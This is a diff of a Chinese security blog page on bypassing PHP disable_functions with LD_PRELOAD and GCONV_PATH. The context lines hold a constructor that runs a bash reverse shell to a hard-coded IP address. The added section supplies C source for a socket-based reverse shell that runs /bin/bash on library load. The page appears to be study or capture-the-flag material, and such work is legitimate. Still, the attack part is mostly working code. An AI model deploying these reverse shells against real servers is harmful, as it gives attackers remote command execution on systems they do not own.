@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/disable-function/image-20231102163759470.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/disable-function/image-20231123233111393.png">
 <meta property="article:published_time" content="2023-09-06T10:29:06.000Z">
-<meta property="article:modified_time" content="2023-11-24T02:43:14.694Z">
+<meta property="article:modified_time" content="2024-03-02T11:28:25.316Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/disable-function/image-20231102163700318.png">
@@ -235,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          26k 字
+          27k 字
         
       </span>
     
@@ -246,7 +246,7 @@
         
         
         
-          220 分钟
+          226 分钟
         
       </span>
     
@@ -334,7 +334,7 @@
 <div class="code-wrapper"><pre><code class="hljs lisp">error_log(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">;</span>
 mb_send_mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">;</span></code></pre></div>
 
-<h4 id="预加载共享对象"><a href="#预加载共享对象" class="headerlink" title="预加载共享对象"></a>预加载共享对象</h4><p>系统通过LD_PRELOAD预先加载共享对象，如果在加载时就执行代码，就不用劫持函数以此绕过disable_function。GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。</p>
+<h3 id="预加载共享对象"><a href="#预加载共享对象" class="headerlink" title="预加载共享对象"></a>预加载共享对象</h3><p>系统通过LD_PRELOAD预先加载共享对象，如果在加载时就执行代码，就不用劫持函数以此绕过disable_function。GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。</p>
 <div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
 <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
 <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
@@ -342,6 +342,30 @@ __attribute__ ((constructor)) <span class="hljs-function"><span class="hljs-type
     <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);
     <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/118.89.61.71/7777 &lt;&amp;1&#x27;&quot;</span>);
 &#125;</code></pre></div>
+
+<h3 id="利用socket进行连接"><a href="#利用socket进行连接" class="headerlink" title="利用socket进行连接"></a>利用socket进行连接</h3><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span>
+<span class="hljs-type">char</span> *server_ip = <span class="hljs-string">&quot;vps&quot;</span>;
+<span class="hljs-type">uint32_t</span> server_port = <span class="hljs-number">114514</span>;
+<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">reverse_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((constructor))</span></span>;
+<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">reverse_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-type">int</span> sock = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> attacker_addr = &#123;<span class="hljs-number">0</span>&#125;;
+    attacker_addr.sin_family = AF_INET;
+    attacker_addr.sin_port = <span class="hljs-built_in">htons</span>(server_port);
+    attacker_addr.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(server_ip);
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">connect</span>(sock, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;attacker_addr, <span class="hljs-built_in">sizeof</span>(attacker_addr)) != <span class="hljs-number">0</span>)
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    <span class="hljs-built_in">dup2</span>(sock, <span class="hljs-number">0</span>);
+    <span class="hljs-built_in">dup2</span>(sock, <span class="hljs-number">1</span>);
+    <span class="hljs-built_in">dup2</span>(sock, <span class="hljs-number">2</span>);
+    <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
+&#125;</code></pre></div>
+
+
 
 <h2 id="利用GCONV-PATH环境变量-需要两个文件"><a href="#利用GCONV-PATH环境变量-需要两个文件" class="headerlink" title="利用GCONV_PATH环境变量  (需要两个文件)"></a>利用GCONV_PATH环境变量  (需要两个文件)</h2><p>GCONV_PATH能够使glibc使用用户自定义的<code>gconv_modules</code>文件。<code>gconv_modules</code>文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个<code>.so</code>文件中，即<code>gconv_modules</code>文件提供了各个字符集的<code>.so</code>文件所在位置</p>
 <p>PHP的iconv函数的第一个参数是字符集的名字，这个参数会传递到glibc的<code>iconv_open</code>函数的参数中，<code>iconv_open</code>函数依照<code>GCONV_PATH</code>找到<code>gconv_modules</code>文件的知识找到参数对应的<code>.so</code>文件，然后调用.so文件中的<code>gconv()</code>和<code>gconv_init()</code></p>
